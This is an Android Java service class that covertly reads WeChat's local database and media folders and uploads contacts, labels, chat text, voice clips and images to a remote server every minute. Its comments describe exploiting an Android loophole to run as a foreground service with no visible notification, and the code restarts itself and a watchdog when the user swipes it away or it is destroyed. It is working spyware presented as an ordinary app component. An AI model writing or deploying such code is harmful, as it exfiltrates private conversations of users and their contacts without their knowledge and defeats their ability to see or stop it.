package com.pcjh.assistant;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.PowerManager;
import android.text.TextUtils;
import android.util.Log;

import com.mengma.asynchttp.RequestCode;
import com.mengma.asynchttp.interf.INetResult;
import com.pcjh.assistant.activity.HomeActivity;
import com.pcjh.assistant.base.AppHolder;
import com.pcjh.assistant.base.BaseService;
import com.pcjh.assistant.dao.AppendFansDao;
import com.pcjh.assistant.dao.UploadChatFileDao;
import com.pcjh.assistant.dao.UploadChatLogsDao;
import com.pcjh.assistant.dao.UploadChatLogsForFileDao;
import com.pcjh.assistant.db.DBCipherManager;
import com.pcjh.assistant.entity.FileReturnEntity;
import com.pcjh.assistant.entity.Label;
import com.pcjh.assistant.entity.RConact;
import com.pcjh.assistant.entity.Test;
import com.pcjh.assistant.entity.TestBase;
import com.pcjh.assistant.entity.UserInfo;
import com.pcjh.assistant.entity.Users;
import com.pcjh.assistant.entity.WMessage;
import com.pcjh.assistant.util.SharedPrefsUtil;
import com.pcjh.assistant.util.XmlPaser;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

import rx.Observable;
import rx.Subscriber;
import rx.Subscription;


/**
 * This Service is Persistent Service. Do some what you want to do here.<br/>
 */
public class WorkService extends BaseService implements INetResult{


    /**ProcessDameon
     * =================================================================================
     */
     private static final int sHashCode = 1;

     public static Subscription sSubscription;

     /**
     * 1.防止重复启动，可以任意调用startService(Intent i);
     * 2.利用漏洞启动前台服务而不显示通知;
     * 3.在子线程中运行定时任务，处理了运行前检查和销毁时保存的问题;
     * 4.启动守护服务.
     * 5.简单守护开机广播.
     */
    private int onStart(Intent intent, int flags, int startId) {
        //启动前台服务而不显示通知的漏洞已在 API Level 25 修复，大快人心！
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.M) {
            //利用漏洞在 API Level 17 及以下的 Android 系统中，启动前台服务而不显示通知
            startForeground(sHashCode, new Notification());
            //利用漏洞在 API Level 18 及以上的 Android 系统中，启动前台服务而不显示通知
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2)
                startService(new Intent(getApplication(), WorkNotificationService.class));
        }

        //启动守护服务，运行在:watch子进程中
        startService(new Intent(getApplication(), WatchDogService.class));

          //开始业务 ；// TODO: 2016/11/22
        startWork();


        //若还没有取消订阅，说明任务仍在运行，为防止重复启动，直接返回START_STICKY
        if (sSubscription != null && !sSubscription.isUnsubscribed()) return START_STICKY;

        System.out.println("检查磁盘中是否有上次销毁时保存的数据");
        sSubscription = Observable
                .interval(3, TimeUnit.SECONDS)
                .subscribe(new Subscriber<Long>() {
                    @Override
                    public void onCompleted() {
                    }
                    @Override
                    public void onError(Throwable e) {
                    }
                    @Override
                    public void onNext(Long count) {
                        System.out.println("每 3 秒采集一次数据... count = " + count);
                        if (count > 0 && count % 18 == 0)
                            System.out.println("保存数据到磁盘。 saveCount = " + (count / 18 - 1));
                    }
                });

        //开始业务 ; // TODO: 2016/11/22
       startWork();

        getPackageManager().setComponentEnabledSetting(
                new ComponentName(getPackageName(), WatchDogService.class.getName()),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);

        return START_STICKY;
    }
//
//      =======================================================================================
//





    private UserInfo  userInfo;
    private Users  users ;
    /**
     * 从本地数据库中获得的联系人；(缓存联系人)
     */
    private HashMap<String,RConact> conacts =new HashMap<String,RConact>() ;

    /**
     * 从微信中获得联系人
     */
    private HashMap<String, RConact>  conactsFromWx =new HashMap<String ,RConact>();
    /***
     * 第一次请求的情况联系人 ；
     */

    boolean isFirstGetConacts =true ;


    /**
     * 增加的联系人 ；
      */
    private HashMap<String, RConact>  rcAdded = new HashMap<String, RConact>();

    /**
     * 改变的联系人
     */
    private HashMap<String, RConact>  rcChanged =  new HashMap<String, RConact>();



    private AppendFansDao appendFansDao =new AppendFansDao(this,this) ;
    private UploadChatLogsDao uploadChatLogsDao =new UploadChatLogsDao(this,this) ;
    private UploadChatFileDao uploadChatFileDao =new UploadChatFileDao(this,this) ;
    private UploadChatLogsForFileDao uploadChatLogsForFilesDao =new UploadChatLogsForFileDao(this,this) ;
    /**
     * Key:LabelId ;
     * Value:Lable ;
     */
    private HashMap<String,Label> labels =new HashMap<String,Label>() ;
    private ArrayList<WMessage>  wmsgsText =new ArrayList<WMessage>() ;
    private ArrayList<WMessage>  wmsgsFile =new ArrayList<WMessage>();

    private boolean isUploadingTextMessge =false;
    private boolean isUploadingFileMessge =false;

    /**
     * 当前正在上传的File Msg
     */
    private WMessage currentUploadFileMsg = null;
    private Timer timer  ;
    private Handler handler =new Handler(){
        @Override
        public void handleMessage(Message msg) {
            Log.i("szhua","timerrestart");
            startTime =System.currentTimeMillis();
            sendMessageToSever();
        }
    };
    /**
     * 一次上传的最大message数量 ；
     */
    private static final  int nMaxMessage = 30;
    /**
     * 一次上传的最大联系人数量；
     */
    private static final  int nMaxContact = 300;
    /**
     * 最多的重试次数;
     */
    private static final int  nMaxRetryCount =3 ;


    private  static final int  APPENDTYPE =0 ;
    private static final int  CHANGETYPE =1 ;

    /**
     * 上传连天记录的方式 ；
     */
    private static final int UPLOADFILELOGTYPE = 0 ;
    private static final int UPLOAPTEXTLOGTYPE = 1 ;


    /**
     * 任务开始的时候的时间 ；
     */
    private long startTime  ;
    private HashMap<String, Label>  labelsFromWx =new HashMap<String ,Label>() ;
    private PowerManager  pm;
    private PowerManager.WakeLock  wakeLock;
    private int  j;

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return onStart(intent, flags, startId);
    }




     public void startWork(){
         users =new Users();
         users.setDbPath( SharedPrefsUtil.getValue(getBaseContext(),"dbPath","d"));
         users.setPassword( SharedPrefsUtil.getValue(getBaseContext(),"password","d"));
         users.setUin( SharedPrefsUtil.getValue(getBaseContext(),"uin","d"));
         String token = SharedPrefsUtil.getValue(getBaseContext(),"token","");
         String wxid =    SharedPrefsUtil.getValue(getBaseContext(),"wxid","");
         AppHolder.getInstance().setToken(token);
         userInfo =new UserInfo() ;
         userInfo.setWxId(wxid);
         AppHolder.getInstance().setUser(userInfo);
         timer =new Timer() ;
         /**
          * 60秒执行一次若是没有传递完就跳过；
          */
         timer.schedule(new TimerTask(){
             @Override
             public void run() {
                 Log.i("serviceStart","start") ;
                 Log.i("isUploading","isUploadingFileMessge"+isUploadingFileMessge);
                 Log.i("isUploading","isUploadingTextMessge"+isUploadingTextMessge);
                 if(!isUploadingFileMessge&&!isUploadingTextMessge){
                     if(!checkIsWifi()){
                         isUploadingTextMessge =false ;
                         isUploadingFileMessge =false ;
                         Log.i("szhua","isnotwifi");
                     }else{
                         handler.sendEmptyMessage(0);
                     }
                 }else{
                     long endTime =System.currentTimeMillis() ;
                     //超过二十秒的话，就进行重新开始任务；
                     if(((endTime-startTime)/1000)>1200){
                         handler.sendEmptyMessage(0);
                     }
                     Log.i("szhua","time"+(endTime/1000));
                 }
             }
         },0,60000);
    }



    public void sendMessageToSever() {
        /**
         * 刚开始便执行正在上传任务了 ；
         */
        isUploadingFileMessge =true ;
        isUploadingTextMessge =true ;
        currentUploadFileMsg = null;
        rcAdded.clear();
        rcChanged.clear();
//        wmsgsText.clear();
//        wmsgsFile.clear();
        labelsFromWx.clear();
        conactsFromWx.clear();
        /**
         * 检测当前的微信账号 ；
         */
        try {
            String uin = XmlPaser.getUidFromFile();
            //当前的账号和原来的不一样的情况下  ;
            //重新获取文件 ；
            if(!getUinString().equals(uin)&&!uin.equals("0")){
               resetUsesrs();
            }
        }catch (Exception e){
            e.printStackTrace();
             isUploadingFileMessge =false ;
             isUploadingTextMessge =false  ;
        }
        /**
         * 从微信中获取标签 ;
         */
        try {
             labelsFromWx =_getLabels(users);
        }catch (Exception e){
             isUploadingFileMessge =false ;
             isUploadingTextMessge =false ;
             e.printStackTrace();
        }
        /**
         * 从微信中获得的联系人；
         */
        try {
            conactsFromWx = _GetContact(users);
        }catch (Exception e){
            isUploadingFileMessge =false ;
            isUploadingTextMessge =false ;

            e.printStackTrace();
        }
        HashMap<String, RConact> conactsCache = new HashMap<String, RConact>();
        /**
         * 将没用的联系人过滤掉 ；
         */
        for(String key :conactsFromWx.keySet()){
            RConact rc =conactsFromWx.get(key) ;
            //username不是以下的属性就行；
            if (!rc.getUsername().equals("weixin") && !rc.getUsername().substring(0, 3).equals("gh_")
                    && !rc.getUsername().equals("filehelper")&&!rc.getUsername().contains("@chatroom")&&!rc.getUsername().contains("fake_")) {
                conactsCache.put(key,rc);
            }
        }
        conactsFromWx.clear();
        conactsFromWx.putAll(conactsCache);
        conactsCache=null;
        Log.i("szhua","contactsSizeWx"+conactsFromWx.size());
        /**
         * 若是第一次进入该service的时候查询数据库 ;
         */
        if (isFirstGetConacts) {
            try {
             //  conacts = DBCipherManager.getInstance(getBaseContext()).quryForRconacts();
            }catch (Exception e){
                isUploadingFileMessge =false ;
                isUploadingTextMessge =false  ;
            }
        }
        conacts.clear();
        Log.i("szhua","contactsSize"+conacts.size());
        /**
         * 本地和微信的联系人进行比较，多的就添加；
         * 分开处理本地的数据库;
         */
        for (String key :conactsFromWx.keySet()){
            RConact rc =conactsFromWx.get(key) ;
            //增加的 ；
            if(conacts.get(key)==null){
                rcAdded.put(key,rc);
            }else{
                RConact localCotact =conacts.get(key);
                if(!compareRcontac(rc,localCotact)){
                    rcChanged.put(key,rc);
                }
            }
        }



        if (!rcAdded.isEmpty()) {
            for (String key :rcAdded.keySet()){
                rcAdded.get(key).setLableChageed(true);
            }
      addContactsToSever(rcAdded,labelsFromWx,APPENDTYPE);
        }

        if(!rcChanged.isEmpty()){
           addContactsToSever(rcChanged,labelsFromWx,CHANGETYPE);
        }
        /*
        更新缓存的数据
         */
        labels.clear();
        labels.putAll(labelsFromWx);

        conacts.clear();
        conacts.putAll(conactsFromWx);
        /**
         * 上传聊天记录;
         */
        uploadMessage();
    }

    public void  uploadMessage(){
        ArrayList<WMessage> wmsgs = new ArrayList<WMessage>();
        Log.i("szhua","msgId:"+getMsgId());
        Log.i("szhua","msgIdPre:"+getMessageIdPreSend());
        Log.i("szhua","contacts"+conacts.size());
      try{
        wmsgs = (ArrayList<WMessage>) queryMessage(users,getMsgId(),nMaxMessage);
      }catch (Exception e){
          isUploadingFileMessge =false ;
          isUploadingTextMessge =false ;
      }
        /**
         * 抽取有用的信息 ;
         */
        for (WMessage wmsg : wmsgs) {
            if (conacts.containsKey(wmsg.getTalker())) {
                wmsg.setDisplayName(conacts.get(wmsg.getTalker()).getAlias());
                //对信息进行分类；
                classifyMessage(wmsg);
            }
        }
        Log.i("szhua","wmsgsize"+wmsgs.size());

        /**
         * 检查是否又重复上传的情况；
         * 若是有的情况下，停止上传 ；（对变量不作处理）
         *
         */
        if(!checkMessageIsReSent()){
          sendAllMessageToSever(wmsgs);
        }

        //释放内存；
        wmsgs.clear();
        wmsgs = null;

    }

    /**
     * 将所有的聊天记录上传到服务器 ；
     */

    public void sendAllMessageToSever(ArrayList<WMessage> wmsgs ){
        //将文件的信息传递到服务器；
        if (!wmsgsFile.isEmpty()){
            sendFileMessageToServer();
        }else{
            isUploadingFileMessge =false ;
        }
        if(wmsgsText.isEmpty()){
            isUploadingTextMessge =false ;
        }else {
            Log.i("szhua","wtextSize"+wmsgsText.size());
            //将文本的信息传递到服务器；
            sendTextMessageToSever(wmsgsText,UPLOAPTEXTLOGTYPE);
        }
        /**
         * 存储这一次上传前的msgId;
         */
        setMessageIdPreSend();
        /**
         * 两个都为空的情况下 ；
         */
        if(wmsgsFile.isEmpty()&&wmsgsText.isEmpty()&&wmsgs!=null&&wmsgs.size()>0){
            setMsgId(wmsgs.get(wmsgs.size()-1).getMsgId());
        }
    }



    /**
     * 上传服务器成功以后为Message设置上传的路径；
     * @param fileReE
     */
    public void setFilePathToMessage(FileReturnEntity fileReE){
        if(this.currentUploadFileMsg != null){
            if(TextUtils.isEmpty(currentUploadFileMsg.getFilePath())){
                currentUploadFileMsg.setFilePath(fileReE.getFilepath());
                currentUploadFileMsg.setServerPath(fileReE.getServer());
                currentUploadFileMsg.setFilesize(fileReE.getFilesize());
                currentUploadFileMsg.setContent(fileReE.getFilepath());
            }
        }
    }
    /**
     * 上传文件聊天到服务器；标识并且设置一些属性；
     */
    public void sendFileMessageToServer(){
        //若是没有上传文件的路径的话，就进行上传;
        this.currentUploadFileMsg = null;
        for (WMessage wMessage : wmsgsFile) {
            if (TextUtils.isEmpty(wMessage.getFilePath())) {
                //  若是达到最大的上传次数的话；
                if (wMessage.getUploadToServerCount() > nMaxRetryCount) {
                    wMessage.setFilePath("replaceFilePath");
                    continue;
                }
                else{
                    currentUploadFileMsg = wMessage;
                    break;
                }
            }
        }
        if(currentUploadFileMsg == null){
            //无可上传文件，则上传文件结束，开始上传聊天信息
            uploadChatLogsForFilesDao.uploadChatLogsForFile(getWx(),getToken(),wmsgsFile);
        }else{
            //上传文件
            currentUploadFileMsg.addUploadCount();
            uploadChatFileDao.uploadChatFile(getWx(),getToken(),currentUploadFileMsg.getFile(),currentUploadFileMsg.getMsgId());
        }
    }
    /**
     * 上传文本聊天到服务器；
     */
    public  void sendTextMessageToSever(ArrayList<WMessage> wmsgsText,int type){
        /**
         * 分成30条一传
         */
        if ( wmsgsText.size() > 0) {
             isUploadingTextMessge =true;
                if(type==UPLOADFILELOGTYPE){
                    uploadChatLogsForFilesDao.uploadChatLogsForFile(getWx(),getToken(),wmsgsText);
                    uploadChatLogsForFilesDao.setMsgId(wmsgsText.get(wmsgsText.size()-1).getMsgId());
                }else{
                    uploadChatLogsDao.uploadChatLogs(getWx(),getToken(),wmsgsText);
                    uploadChatLogsDao.setMsgId(wmsgsText.get(wmsgsText.size()-1).getMsgId());
                }
        }
    }
    /**
     * 对信息进行分类并添加在文件和文本集合中；
     * @param wmsg
     */
    public void classifyMessage(WMessage wmsg ){
        /**
         * 是音频的情况下；
         */
        if(wmsg.isVoice){
            //音频的路径 ；
            String voicePath =Environment.getExternalStorageDirectory().getAbsolutePath() + "/tencent/MicroMsg/" + users.getUserId()+wmsg.getImgPath();
            File file = new File(voicePath);
            if(file.exists()){
                wmsg.setFile(file);
                wmsg.setSendType(1);
                wmsgsFile.add(wmsg);
            }
        }else if(wmsg.isImage){
            //tupian的路径; 图片的上传
            String orign= wmsg.getImgPath() ;
            String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/tencent/MicroMsg/" + users.getUserId() + "/image2/" + orign + ".jpg";
            File file = new File(path);
            if(file.exists()){
                wmsg.setFile(file);
                wmsg.setSendType(2);
                wmsgsFile.add(wmsg);
            }
    } else {
        //纯文本的shangchuan;
        wmsg.setSendType(0);
        wmsgsText.add(wmsg);
    }
    }
    /**
     * 比较两个联系人是否相同 ；
     * @param wx
     * @param local
     * @return
     */
   public  boolean compareRcontac(RConact wx ,RConact local){
       if(!wx.getType().equals(local.getType())){
           return false;
       }

       if(TextUtils.isEmpty(wx.getConRemark())&&!TextUtils.isEmpty(local.getConRemark())){
           wx.setLableChageed(true);
           return  false;
       }
       if(!TextUtils.isEmpty(wx.getConRemark())){
        if(!wx.getConRemark().equals(local.getConRemark())){
          return  false ;
        }
       }
       if(TextUtils.isEmpty(wx.getContactLabelIds())&&!TextUtils.isEmpty(local.getContactLabelIds())){
           wx.setLableChageed(true);
           return  false;
       }
       if(!TextUtils.isEmpty(wx.getContactLabelIds())){
       if(!wx.getContactLabelIds().equals(local.getContactLabelIds())){
           wx.setLableChageed(true);
           return  false ;
       }}
       return  true;
   }

    /**
     *
     * @param rcAdded
     * @param labelsFromWx
     * @param type 上传的类型 ；
     */
    public void addContactsToSever(HashMap<String ,RConact> rcAdded ,HashMap<String,Label> labelsFromWx,int type){
        /**
         * 上传新增联系人/或是更改联系人；
         */
        ArrayList<TestBase> tests = new ArrayList<TestBase>();
        for (String key : rcAdded.keySet()) {
            RConact rConact = rcAdded.get(key);
            TestBase contactToAdd = null;
            /**
             * 若是标签改变的情况下 ；
             */
            if(rConact.isLableChageed) {
                contactToAdd = new Test();
                ArrayList<String> tags = new ArrayList<>();
                if (!TextUtils.isEmpty(rConact.getContactLabelIds())) {
                    String[] a = rConact.getContactLabelIds().split(",");
                    for (String s : a) {
                        if (labels.get(s) != null) {
                            tags.add(labels.get(s).getLabelName());
                        }else  if (labelsFromWx.get(s) != null) {
                            tags.add(labelsFromWx.get(s).getLabelName());
                        }
                    }
                }
                ((Test)contactToAdd).setTagname(tags);
            }else{
                contactToAdd = new TestBase();
            }
            contactToAdd.setFans_wx(rConact.getAlias());
            if (!TextUtils.isEmpty(rConact.getNickname())) {
                contactToAdd.setFans_nickname(rConact.getNickname());
            }else{
                contactToAdd.setFans_nickname("");
            }
            if(!TextUtils.isEmpty(rConact.getConRemark())){
                contactToAdd.setRemark(rConact.getConRemark());
            }else{
                contactToAdd.setRemark("");
            }
            contactToAdd.setModify_time(""+System.currentTimeMillis() / 1000);
            contactToAdd.setModify_type(rConact.getType());
            tests.add(contactToAdd);
            if (tests.size() >= nMaxContact) {
//                if(type==APPENDTYPE){
//                appendFansDao.apppendFans(getWx(),getToken(),tests);}
//                else{
//                appendFansDao.changeFans(getWx(),getToken(),tests);}
                tests.clear();
                try {
                    Thread.sleep(200);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

        }
        if (tests.size() > 0) {
            if(type==APPENDTYPE){
                appendFansDao.apppendFans(getWx(),getToken(),tests);}
            else{
                appendFansDao.changeFans(getWx(),getToken(),tests);}
        }
        tests.clear();
    }
    @Override
    public IBinder onBind(Intent intent) {
        onStart(intent,0,0) ;
        return null;
    }


    private void onEnd(Intent rootIntent) {
        System.out.println("保存数据到磁盘。");
        startService(new Intent(getApplication(), WorkService.class));
        startService(new Intent(getApplication(), WatchDogService.class));
    }

    /**
     * 最近任务列表中划掉卡片时回调
     */
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        onEnd(rootIntent);
    }

    @Override
    protected void reGetMessage() {
    }

    /**
     *请求成功时候的处理 ；
     * @param requestCode 网络请求顺序号，第一个请求，NetRequestOrderNum=0,处理第一条请求的结果。如果等于1,
     */
    @Override
    public void onRequestSuccess(int requestCode) {
        super.onRequestSuccess(requestCode);
        /**
         * 请求上传文件成功以后；
         */
        if(requestCode==RequestCode.UPLOADFILE){
             FileReturnEntity fe = uploadChatFileDao.getFileReturnEntity() ;
            /**
            * 为上传成功的聊天设置文件路径；
            */
            setFilePathToMessage(fe);
            /**
            * 上传接下来的文件；
            */
            sendFileMessageToServer();
        }
        /**
         * 传递完文本信息的话 ；
         */
        if(requestCode==RequestCode.UPLOADTEXT){
            isUploadingTextMessge =false;
            setMessaageIdInCache();
            wmsgsText.clear();
        }

        /**
         * 传递完文件信息的话 ；
         */
        if(requestCode==RequestCode.UPLOADTEXTFORFILE){
            isUploadingFileMessge =false;
            setMessaageIdInCache();
            wmsgsFile.clear();
        }

        else if(requestCode==RequestCode.APPENDFANS){
             if(!rcAdded.isEmpty()){
                 try {
                     DBCipherManager.getInstance(getBaseContext()).updateContacts(rcAdded);
                     rcAdded.clear();
                     isFirstGetConacts =false ;
                 }catch (Exception e){
                     isUploadingTextMessge =false ;
                     isUploadingFileMessge =false ;
                 }

             }
        }
        else if(requestCode==RequestCode.CHANGEFANS){
             if(!rcChanged.isEmpty()){
                 try {
                     DBCipherManager.getInstance(getBaseContext()).updateContacts(rcChanged);
                     rcChanged.clear();
                     isFirstGetConacts =false ;
                 }catch (Exception e){
                     isUploadingTextMessge =false ;
                     isUploadingFileMessge =false ;
                 }

             }
        }
    }
    @Override
    public void onRequestError(int requestCode, String errorInfo, int error_code) {
        if(requestCode==RequestCode.UPLOADFILE){
            sendFileMessageToServer();
        }
        /**
         * 传递完文本信息的话 ；
         * 就停止，下次传递 ；不更新msgId ;
         */
        if(requestCode==RequestCode.UPLOADTEXT){
            isUploadingTextMessge =false;
            wmsgsText.clear();
        }
        /**
         * 传递完文件信息的话；
         * 就停止，下次传递 ；不更新msgId ;
         */
        if(requestCode==RequestCode.UPLOADTEXTFORFILE){
                isUploadingFileMessge =false;
                   wmsgsFile.clear();
        }
        Log.i("szhua","requestErro");
    }

    /**
     * 出错的情况下 ；
     * @param requestCode
     * @param errorNo
     * @param errorMessage
     */
    @Override
    public void onRequestFaild(int requestCode, String errorNo, String errorMessage) {
        Log.i("szhua","requestFailed") ;
        /**
         * 再次请求上传文件 ;
         */
        if(requestCode==RequestCode.UPLOADFILE){
            sendFileMessageToServer();
        }
        /**
         * 传递完文本信息的话 ；
         * 就停止，下次传递 ；不更新msgId ;
         */
        if(requestCode==RequestCode.UPLOADTEXT){
            isUploadingTextMessge =false;
            wmsgsText.clear();
        }
        /**
         * 传递完文件信息的话；
         * 就停止，下次传递 ；不更新msgId ;
         */
        if(requestCode==RequestCode.UPLOADTEXTFORFILE){
            isUploadingFileMessge =false;
            wmsgsFile.clear();
        }
    }
    @Override
    public void onNoConnect() {
        // TODO: 2016/11/19s
        isUploadingTextMessge=false ;
        isUploadingFileMessge=false ;
    }

    public String getWx (){
     String wx =   SharedPrefsUtil.getValue(getBaseContext(),"wx","") ;
      return  wx ;
    }
    public String getToken (){
        String token =SharedPrefsUtil.getValue(getBaseContext(),"token","") ;
        return  token ;
    }

    public String getMsgId(){
        String msgid =SharedPrefsUtil.getValue(getBaseContext(),getUinString(),"") ;
        if(TextUtils.isEmpty(msgid)){
            msgid = "0";
        }
        return  msgid ;
    }

    //todo  checkIsRight ；（切换账号的情况下） ；
    public  void setMsgId(String msgId){
        SharedPrefsUtil.putValue(getBaseContext(),getUinString(),msgId);
    }

    @Override
    public void onDestroy() {
        if(wakeLock!=null){
          wakeLock.release();
        }
        onEnd(null);
        super.onDestroy();
    }


    /**
     * 判断聊天记录是否在重复的上传 ;
     * @return
     */
    public boolean checkMessageIsReSent(){
        int textId =0 ;
        int fileId =0 ;
        int msgIdPreSend =getMessageIdPreSend() ;
        if(!wmsgsText.isEmpty()){
            textId =    Integer.parseInt(wmsgsText.get(wmsgsText.size()-1).getMsgId()) ;
        }
        if(!wmsgsFile.isEmpty()){
            fileId =Integer.parseInt(wmsgsFile.get(wmsgsFile.size()-1).getMsgId()) ;
        }
        /**
         * 若是没有成功的情况的话，msgId不会增加，再次从数据库取数据的话msgIdPreSend会和Math.max(textId,fileId) 相等，这种情况不计算在内 ；
         */
        /**
         * 若是上次传递时候的msgId 大于现在的msgId,那么现在的聊天记录肯定是获取的重复的，不要再上传 ；
         */
          if(msgIdPreSend>Math.max(textId,fileId)){
              return  true ;
          }
        /**
         *  若是xml存储的msgId 和现在的msgId 相等的话也是重复了 ;请求还没完成又重新启了服务的情况  ;()todo
         *
         */
        if(Integer.parseInt(getMsgId())==Math.max(textId,fileId)){
              return  true ;
          }
        return  false ;
    }
    public int getMessageIdPreSend(){
        String msgid =SharedPrefsUtil.getValue(getBaseContext(),getUinString(),"") ;
        if(TextUtils.isEmpty(msgid)){
            return  0 ;
        }
        return  Integer.parseInt(msgid) ;
    }
    /**
     * 设置上传聊天记录时候（请求之前的msgId） ；
     */
    public void setMessageIdPreSend(){
        int textId =0 ;
        int fileId =0 ;
        if(!wmsgsText.isEmpty()){
            textId =    Integer.parseInt(wmsgsText.get(wmsgsText.size()-1).getMsgId()) ;
        }
        if(!wmsgsFile.isEmpty()){
            fileId =Integer.parseInt(wmsgsFile.get(wmsgsFile.size()-1).getMsgId()) ;
        }
        // TODO: 2016/11/22  
      //  SharedPrefsUtil.putValue(getBaseContext(),getUinString()+"lastMsg",Math.max(textId,fileId));
         
        
        if(textId>fileId){
           SharedPrefsUtil.putValue(getBaseContext(),getUinString()+"lastMsg",textId);
        }
        if(textId<fileId){
            setMsgId(""+fileId);
            SharedPrefsUtil.putValue(getBaseContext(),getUinString()+"lastMsg",fileId);
        }
    }
    /**
     * 在xml中存储messageId  ;(用于下次请求使用) ：
     */
    public void setMessaageIdInCache (){
        int textId =0 ;
        int fileId =0 ;
        if(!wmsgsText.isEmpty()){
         textId =    Integer.parseInt(wmsgsText.get(wmsgsText.size()-1).getMsgId()) ;
        }
        if(!wmsgsFile.isEmpty()){
            fileId =Integer.parseInt(wmsgsFile.get(wmsgsFile.size()-1).getMsgId()) ;
        }

        if(textId>fileId){
            setMsgId(""+textId);
        }
        if(textId<fileId){
            setMsgId(""+fileId);
        }
    }



    /**
     * 判断当前的网络状态; 本app只在wifi的
     * @return
     */
    private boolean checkIsWifi(){
        ConnectivityManager connManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connManager.getActiveNetworkInfo();
        if(networkInfo!= null) {
            //2.获取当前网络连接的类型信息
            int networkType = networkInfo.getType();
            if(ConnectivityManager.TYPE_WIFI == networkType){
                return  true ;
            }
        return connManager.getActiveNetworkInfo().isAvailable();
        }
        return false;
    }
    public String getUinString(){
        String uin = SharedPrefsUtil.getValue(getBaseContext(),"uin","") ;
        return   uin ;
    }










    public static class WorkNotificationService extends Service {

        /**
         * 利用漏洞在 API Level 18 及以上的 Android 系统中，启动前台服务而不显示通知
         */
        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            startForeground(WorkService.sHashCode, new Notification());
            stopSelf();
            return START_STICKY;
        }
        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
    }


}
